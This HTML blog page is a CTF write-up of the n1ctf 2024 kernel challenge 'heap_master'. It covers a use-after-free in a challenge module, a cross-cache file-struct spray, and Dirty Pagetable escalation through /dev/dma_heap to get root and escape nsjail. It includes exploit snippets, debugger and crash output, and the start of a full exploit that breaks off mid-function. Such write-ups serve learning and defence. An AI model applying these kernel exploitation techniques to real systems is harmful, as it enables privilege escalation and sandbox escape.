@@ -1,0 +1,862 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <title>
+  heap_master - n1ctf 2024 · bitfriends&#39; blog
+</title>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="light dark">
+
+
+
+
+<meta name="author" content="bitfriends">
+<meta name="description" content="Pwning the kernel via cross-cache UAF and PTE corruption">
+<meta name="keywords" content="blog,reseacher,personal">
+
+
+
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="heap_master - n1ctf 2024">
+	<meta name="twitter:description" content="Pwning the kernel via cross-cache UAF and PTE corruption">
+
+<meta property="og:url" content="http://localhost:1313/posts/n1ctf_heap_master/">
+	<meta property="og:site_name" content="bitfriends&#39; blog">
+	<meta property="og:title" content="heap_master - n1ctf 2024">
+	<meta property="og:description" content="Pwning the kernel via cross-cache UAF and PTE corruption">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2025-01-09T15:59:10+01:00">
+		<meta property="article:modified_time" content="2025-01-09T15:59:10+01:00">
+		<meta property="article:tag" content="Linux">
+		<meta property="article:tag" content="Kernel">
+
+
+
+
+<link rel="canonical" href="http://localhost:1313/posts/n1ctf_heap_master/">
+
+
+<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>
+
+
+  
+  
+  <link rel="stylesheet" href="/css/coder.css" media="screen">
+
+
+
+
+
+
+  
+    
+    
+    <link rel="stylesheet" href="/css/coder-dark.css" media="screen">
+  
+
+
+
+ 
+
+
+
+
+<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
+<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
+<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">
+
+<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+
+
+
+
+<body class="preload-transitions colorscheme-auto">
+  
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+  <main class="wrapper">
+    <nav class="navigation">
+  <section class="container">
+    
+    <a class="navigation-title" href="http://localhost:1313/">
+      bitfriends&#39; blog
+    </a>
+    
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/">Blog</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/posts/about/">About</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+    <div class="content">
+      
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">
+            <a class="title-link" href="http://localhost:1313/posts/n1ctf_heap_master/">
+              heap_master - n1ctf 2024
+            </a>
+          </h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
+              <time datetime="2025-01-09T15:59:10&#43;01:00">
+                January 9, 2025
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa-solid fa-clock" aria-hidden="true"></i>
+              10-minute read
+            </span>
+          </div>
+          <div class="authors">
+  <i class="fa-solid fa-user" aria-hidden="true"></i>
+    <a href="/authors/bitfriends/">Bitfriends</a></div>
+
+          <div class="categories">
+  <i class="fa-solid fa-folder" aria-hidden="true"></i>
+    <a href="/categories/ctf/">Ctf</a></div>
+
+          <div class="tags">
+  <i class="fa-solid fa-tag" aria-hidden="true"></i>
+    <span class="tag">
+      <a href="/tags/linux/">Linux</a>
+    </span>
+      <span class="separator">•</span>
+    <span class="tag">
+      <a href="/tags/kernel/">Kernel</a>
+    </span></div>
+
+        </div>
+      </header>
+
+      
+
+
+      <div class="post-content">
+        
+        <p>Heap_master was a kernel pwn challenge from n1ctf. I didn&rsquo;t play the ctf, allthough the
+challenge seemed nice to upsolve. Let&rsquo;s get started</p>
+<p>For the environment, we were given a Linux <code>6.1.110</code> image as well as a config file. Before
+looking at the config file, the fact that we have an nsjail environment. In our case, this
+means a bunch of disabled syscalls, no setuid binaries, and only few useful files in <code>/dev</code>
+and <code>/proc</code> directories. The goal is hereby not only to get root, but also escape the nsjail
+to read <code>flag.txt</code>. We need to take this into account when creating our exploit.</p>
+<p>The challenge consists of a vulnerable kernel module <code>vuln.ko</code>, which exposes a char device at
+<code>/dev/safenote</code>. The module itself is quite simple:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff7b72">__int64</span> <span style="color:#ff7b72">__fastcall</span> <span style="color:#d2a8ff;font-weight:bold">safenote_ioctl</span>(file <span style="color:#ff7b72;font-weight:bold">*</span>f, <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">int</span> cmd, <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">__int64</span> arg)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">__int64</span> v3; <span style="color:#8b949e;font-style:italic">// rdx
+</span></span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">__int64</span> result; <span style="color:#8b949e;font-style:italic">// rax
+</span></span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">u_int32_t</span> heap_idx; <span style="color:#8b949e;font-style:italic">// edx
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#d2a8ff;font-weight:bold">_fentry__</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> ( <span style="color:#d2a8ff;font-weight:bold">copy_from_user</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>ioc_arg, v3, <span style="color:#a5d6ff">4LL</span>) )
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> <span style="color:#ff7b72;font-weight:bold">-</span>EFAULT;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> ( cmd <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">0x1338</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> ( ioc_arg.heap_idx <span style="color:#ff7b72;font-weight:bold">&lt;=</span> <span style="color:#a5d6ff">0xff</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> ( <span style="color:#ff7b72;font-weight:bold">!</span>note[ioc_arg.heap_idx] )
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#d2a8ff;font-weight:bold">kfree</span>(note[ioc_arg.heap_idx]);
+</span></span><span style="display:flex;"><span>      note[ioc_arg.heap_idx] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> <span style="color:#ff7b72;font-weight:bold">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> ( cmd <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">0x1339</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> ( <span style="color:#ff7b72;font-weight:bold">!</span>backdoor_used <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> ioc_arg.heap_idx <span style="color:#ff7b72;font-weight:bold">&lt;=</span> <span style="color:#a5d6ff">0xff</span> )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> ( <span style="color:#ff7b72;font-weight:bold">!</span>note[ioc_arg.heap_idx] )
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#d2a8ff;font-weight:bold">kfree</span>(note[ioc_arg.heap_idx]);
+</span></span><span style="display:flex;"><span>      result <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>      backdoor_used <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">return</span> result;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span> <span style="color:#ff7b72;font-weight:bold">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  result <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72;font-weight:bold">-</span>EINVAL;
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">if</span> ( cmd <span style="color:#ff7b72;font-weight:bold">==</span> <span style="color:#a5d6ff">0x1337</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    heap_idx <span style="color:#ff7b72;font-weight:bold">=</span> ioc_arg.heap_idx;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">if</span> ( ioc_arg.heap_idx <span style="color:#ff7b72;font-weight:bold">&lt;=</span> <span style="color:#a5d6ff">0xff</span> <span style="color:#ff7b72;font-weight:bold">&amp;&amp;</span> <span style="color:#ff7b72;font-weight:bold">!</span>note[ioc_arg.heap_idx] )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      note[heap_idx] <span style="color:#ff7b72;font-weight:bold">=</span> (<span style="color:#ff7b72">char</span> <span style="color:#ff7b72;font-weight:bold">*</span>)<span style="color:#d2a8ff;font-weight:bold">kmem_cache_alloc</span>(note_kcache, \
+</span></span><span style="display:flex;"><span>        ___GFP_ACCOUNT<span style="color:#ff7b72;font-weight:bold">|</span>___GFP_KSWAPD_RECLAIM<span style="color:#ff7b72;font-weight:bold">|</span>___GFP_DIRECT_RECLAIM<span style="color:#ff7b72;font-weight:bold">|</span>___GFP_FS<span style="color:#ff7b72;font-weight:bold">|</span>___GFP_IO);
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> ( note[ioc_arg.heap_idx] )
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">return</span> <span style="color:#a5d6ff">0</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">return</span> <span style="color:#ff7b72;font-weight:bold">-</span>ENOMEM;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#ff7b72">return</span> result;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The basic functionality is to allocate and free heap chunks. However there is a backdoor, which
+lets us free a single chunk without clearing its reference, resulting in a single use-after-free.
+How do we continue? It&rsquo;s obvious that we need to do some kind of cross-cache attack, in order
+to break out of the accounted kmem cache dedicated to this module.</p>
+<p>While searching for the right objects, I found out that <code>msg_msg</code> object is not easily sprayable,
+plus userfaultfd and FUSE seem to be impossible. However I found <code>pipe_buf</code> and the associated
+struct <code>page</code> is a good candidate to do some pre-spraying, since you can spray a lot of data at once.
+This worked, and we can overlap our uaf chunk with user controlled data:</p>
+<pre tabindex="0"><code>pwndbg&gt; x/200gx 0xffffffffc0233420
+0xffffffffc0233420:	0x0000000000000000	0x0000000000000000
+0xffffffffc0233430:	0x0000000000000000	0x0000000000000000
+...
+0xffffffffc0233a10:	0x0000000000000000	0x0000000000000000
+0xffffffffc0233a20:	0xffff9fb35767e100	0x0000000000000000
+0xffffffffc0233a30:	0x0000000000000000	0x0000000000000000
+pwndbg&gt; x/20gx 0xffff9fb35767e100
+0xffff9fb35767e100:	0x4141414141414141	0x4141414141414141
+0xffff9fb35767e110:	0x4141414141414141	0x4141414141414141
+0xffff9fb35767e120:	0x4141414141414141	0x4141414141414141
+...
+</code></pre><p>However I found it quite difficult to corrupt <code>pipe_buf</code> itself, so we need a second target object.
+I came to the conclusion, that spraying struct <code>file</code> wouldn&rsquo;t be a bad idea, since we have
+sufficient permissions and it has <code>f_ops</code> member, which points to a function table. We could
+corrupt this pointer to get RIP control, plus identify the exact struct <code>file</code> which overlaps:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> fds[<span style="color:#a5d6ff">0x1000</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        fds[i] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/tmp/x&#34;</span>, O_RDWR);
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(fds[i] <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;open&#34;</span>);
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">exit</span>(<span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>        } 
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">uaf_delete</span>(fd, loc); <span style="color:#8b949e;font-style:italic">// free&#39;s struct file
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> fds2[<span style="color:#a5d6ff">0x1000</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>)
+</span></span><span style="display:flex;"><span>        fds2[i] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/bin/busybox&#34;</span>, O_RDONLY);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">unsigned</span> <span style="color:#ff7b72">long</span> x <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0x4141414141414141</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> overlap_idx <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#ff7b72;font-weight:bold">-</span><span style="color:#a5d6ff">1</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span>(<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0x1000</span>; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#ff7b72">if</span>(<span style="color:#d2a8ff;font-weight:bold">write</span>(fds[i], <span style="color:#ff7b72;font-weight:bold">&amp;</span>x, <span style="color:#a5d6ff">8</span>) <span style="color:#ff7b72;font-weight:bold">&lt;</span> <span style="color:#a5d6ff">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#d2a8ff;font-weight:bold">perror</span>(<span style="color:#a5d6ff">&#34;write&#34;</span>);
+</span></span><span style="display:flex;"><span>            overlap_idx <span style="color:#ff7b72;font-weight:bold">=</span> i;
+</span></span><span style="display:flex;"><span>            <span style="color:#ff7b72">break</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    }
+</span></span></code></pre></div><p>(We achieve this by checking if file permissions have been altered)</p>
+<p>I could sucessfully identify the uaf&rsquo;ed <code>file</code> struct and even overlap with user data:</p>
+<pre tabindex="0"><code>/tmp $ /exp/exp 
+[*] device fd: 3
+[*] before uaf trigger
+[*] triggered free
+write: Bad file descriptor
+[*] overlap idx: 1586
+[*] overlapping done
+[*] trigger rip
+[    4.364698] general protection fault, probably for non-canonical address 0x41414141414141b9: 0000 [#1] PREEMPT SMP PTI
+[    4.365244] CPU: 1 PID: 157 Comm: exp Tainted: G           OE      6.1.110 #12
+[    4.365244] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
+[    4.365244] RIP: 0010:filp_close+0x1e/0x70
+[    4.365244] Code: 00 48 83 c7 10 e9 a2 94 04 00 66 90 0f 1f 44 00 00 41 55 41 54 49 89 f4 55 48 8b 47 38 48 8b 77 28 48 85 c0 0f 84 7e 40 e1 00 &lt;48&gt; 8f
+[    4.365244] RSP: 0018:ffffaca3c0483f00 EFLAGS: 00000206
+[    4.365244] RAX: 4141414141414141 RBX: 0000000000000000 RCX: 0000000000000000
+[    4.365244] RDX: 0000000000000001 RSI: 4141414141414141 RDI: ffff910896633200
+[    4.365244] RBP: ffffaca3c0483f48 R08: ffff91089fa88000 R09: 0000000035593770
+[    4.365244] R10: 0000000000000636 R11: 0000000000000000 R12: ffff91088da9eec0
+[    4.365244] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
+[    4.365244] FS:  00000000355923c0(0000) GS:ffff91089ef00000(0000) knlGS:0000000000000000
+[    4.365244] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[    4.365244] CR2: 0000000000712334 CR3: 000000000db0e000 CR4: 00000000003006e0
+</code></pre><p>Now we theoretically have RIP control, but we&rsquo;re missing kernel heap and <code>text</code> leaks. This
+was the point where I scrapped the idea of getting RIP control with <code>f_op</code>.</p>
+<p>However then I found out about a <a href="https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606#Dirty-Pagetable"  class="external-link" target="_blank" rel="noopener">blogpost</a> from ptr-yudai. Basically we are elevating our
+<code>file</code> uaf to a pagetable uaf to create overlapping pages. Also there comes <code>/dev/dma_heap</code>
+into play, which helps us to get a physical kernel address r/w. As soon as we achieve this,
+we can just write our shellcode to a kernel function.</p>
+<p>In my exploit, I chose <code>setresuid</code> to overwrite. In our shellcode we need to get root as well
+as escaping the nsjail. This worked flawlessly thanks to the inspiration from ptr-yudai.
+We get the flag and win:</p>
+<pre tabindex="0"><code>/tmp $ /exp/exp 
+[*] device fd: 3
+[*] before uaf trigger
+[*] triggered free
+write: Bad file descriptor
+[*] overlap idx: 1793
+[*] overlapping done
+[*] doing pte spray
+[*] dma_buf_fd: 5
+[*] doing pte spray done
+[*] corrupt pte entry
+[*] searching for overlapping page
+[*] found overlapping page: 0xf2427000
+[*] remapping...
+[*] corrupt pte entry again
+[*] dma buffer contains: 0x8000000012676867
+[*] dma buffer contains: 0x800000000009c067
+[*] found victim page table: 0xeea00000
+[*] physical kbase: 0xb000000
+[*] dma buffer contains: 0x800000000b1af067
+[*] uid: 0
+[*] win!
+flag{1337}
+[*] done
+</code></pre><p>The full exploit is here:</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define _GNU_SOURCE
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;sched.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;stdio.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;fcntl.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;stdint.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;unistd.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;stdlib.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;string.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;sys/mman.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;sys/ioctl.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#include</span> <span style="color:#8b949e;font-weight:bold;font-style:italic">&lt;linux/dma-heap.h&gt;</span><span style="color:#8b949e;font-weight:bold;font-style:italic">
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define CREATE_CHUNK 4919
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define DELETE_CHUNK 4920
+</span></span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define DELETE_CHUNK_NOZERO 4921
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#8b949e;font-weight:bold;font-style:italic">#define MAX_IDX 0xff
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">bind_cpu</span>(<span style="color:#ff7b72">int</span> cpu) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">cpu_set_t</span> mask;
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">CPU_ZERO</span>(<span style="color:#ff7b72;font-weight:bold">&amp;</span>mask);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">CPU_SET</span>(cpu, <span style="color:#ff7b72;font-weight:bold">&amp;</span>mask);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">sched_setaffinity</span>(<span style="color:#a5d6ff">0</span>, <span style="color:#ff7b72">sizeof</span>(mask), <span style="color:#ff7b72;font-weight:bold">&amp;</span>mask);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">void</span> <span style="color:#d2a8ff;font-weight:bold">unshare_setup</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">char</span> edit[<span style="color:#a5d6ff">0x100</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> tmp_fd;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">unshare</span>(CLONE_NEWNS <span style="color:#ff7b72;font-weight:bold">|</span> CLONE_NEWUSER <span style="color:#ff7b72;font-weight:bold">|</span> CLONE_NEWNET);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    tmp_fd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/proc/self/setgroups&#34;</span>, O_WRONLY);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">write</span>(tmp_fd, <span style="color:#a5d6ff">&#34;deny&#34;</span>, <span style="color:#d2a8ff;font-weight:bold">strlen</span>(<span style="color:#a5d6ff">&#34;deny&#34;</span>));
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">close</span>(tmp_fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    tmp_fd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/proc/self/uid_map&#34;</span>, O_WRONLY);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">snprintf</span>(edit, <span style="color:#ff7b72">sizeof</span>(edit), <span style="color:#a5d6ff">&#34;0 %d 1&#34;</span>, <span style="color:#d2a8ff;font-weight:bold">getuid</span>());
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">write</span>(tmp_fd, edit, <span style="color:#d2a8ff;font-weight:bold">strlen</span>(edit));
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">close</span>(tmp_fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    tmp_fd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">open</span>(<span style="color:#a5d6ff">&#34;/proc/self/gid_map&#34;</span>, O_WRONLY);
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">snprintf</span>(edit, <span style="color:#ff7b72">sizeof</span>(edit), <span style="color:#a5d6ff">&#34;0 %d 1&#34;</span>, <span style="color:#d2a8ff;font-weight:bold">getgid</span>());
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">write</span>(tmp_fd, edit, <span style="color:#d2a8ff;font-weight:bold">strlen</span>(edit));
+</span></span><span style="display:flex;"><span>    <span style="color:#d2a8ff;font-weight:bold">close</span>(tmp_fd);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ff7b72">int</span> <span style="color:#ff7b72;font-weight:bold">**</span><span style="color:#d2a8ff;font-weight:bold">spray_pipes</span>(<span style="color:#ff7b72">int</span> cnt) { <span style="color:#8b949e;font-style:italic">// 0x4
+</span></span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">int</span> <span style="color:#ff7b72;font-weight:bold">**</span>pipe_fd <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">malloc</span>(cnt<span style="color:#ff7b72;font-weight:bold">*</span><span style="color:#a5d6ff">8</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff7b72">for</span> (<span style="color:#ff7b72">int</span> i <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>; i <span style="color:#ff7b72;font-weight:bold">&lt;</span> cnt; i<span style="color:#ff7b72;font-weight:bold">++</span>) {
+</span></span><span style="display:flex;"><span>        pipe_fd[i] <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#d2a8ff;font-weight:bold">malloc</span>(<span style="color:#a5d6ff">0x10</span> <span style="color:#ff7b72;font-weight:bold">+</span> <span style="color:#a5d6ff">1</span>);
+</span></span><span style="display:flex;"><span>
